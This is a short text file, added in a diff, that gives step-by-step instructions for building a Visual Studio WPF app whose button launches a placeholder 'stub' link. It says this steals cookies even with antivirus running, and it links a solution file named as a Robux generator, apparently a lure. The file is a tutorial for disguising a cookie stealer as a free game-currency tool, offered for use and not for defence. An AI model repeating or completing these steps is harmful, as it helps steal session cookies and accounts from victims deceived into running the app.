@@ -1,0 +1,16 @@
+PANEL XSS
+
+1.  Go to visual studio 2019.
+2. Make a WPFApp
+3. Design it how u want and add a button.
+4. Double click button and add this
+
+CODE:
+
+System.Diagnostics.Process.Start("yourstublink")
+
+THIS SHOULD MAKE IT AUTO EXECUTE AND GIVE U COOKIES WITH ANTIVIRUS ON TOO!
+
+----------
+
+Free layout: https://cdn.discordapp.com/attachments/836335488176619550/848123945172992020/Robux_Gen.sln
